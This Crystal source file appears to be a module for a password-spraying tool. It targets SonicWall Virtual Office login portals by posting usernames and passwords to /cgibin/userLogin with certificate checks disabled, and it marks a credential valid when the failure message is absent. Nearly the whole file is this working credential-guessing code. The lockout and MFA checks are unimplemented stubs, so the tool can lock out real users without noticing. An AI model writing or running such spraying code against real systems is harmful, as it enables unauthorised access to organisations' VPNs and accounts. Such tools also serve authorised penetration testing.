require "http/client"
require "json"


class Sonicwall_VirtualOffice_5x < Sprayer

    ## only uncomment if needed
    def initialize(usernames : Array(String), password : Array(String) )
        # init any special or default variables here
        super
        @domain = "LocalDomian"
    end

    # returns an array of [username, password, valid, lockout, mfa]
    def spray(username : String, password : String) 
        lockedout = false
        valid = false
        mfa = false

        # 
        # enter your auth check here and make sure 
        #
        # if @target.starts_with? "https://"
        #     url = @target.split("https://")[1]
        # elsif @target.starts_with? "http://"
        #     url = @target.split("http://")[1]
        # else 
        #     url = @target
        # end
        url = URI.parse(@target)
        # puts "url: #{url}" 
    
        # context = OpenSSL::SSL::Context::Client.insecure
        context = OpenSSL::SSL::Context::Client.new
        context.verify_mode = OpenSSL::SSL::VerifyMode::NONE

        client = HTTP::Client.new(url, tls: context)
        header = HTTP::Headers{
            # "User-Agent" => "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "User-Agent" => @useragent,
            "Accept" => "*/*",
            "Accept-Language" => "en-US,en;q=0.5",
            "Accept-Encoding" => "gzip, deflate",
            "Pragma" => "no-cache",
        }

        form = "username=#{username}&password=#{URI.encode_www_form password}&domain=#{@domain}&state=login&login=true&verifyCert=0&portalname=VirtualOffice&ajax=true"
        post = client.post("/cgibin/userLogin", form: form)

        # returns json but its like 4 lines
        valid = true if !post.body.includes? "Login failed - Incorrect username/password"





        #
        # end of your auth check here
        # 
        
        return [username, password, valid, lockedout, mfa]
    end
end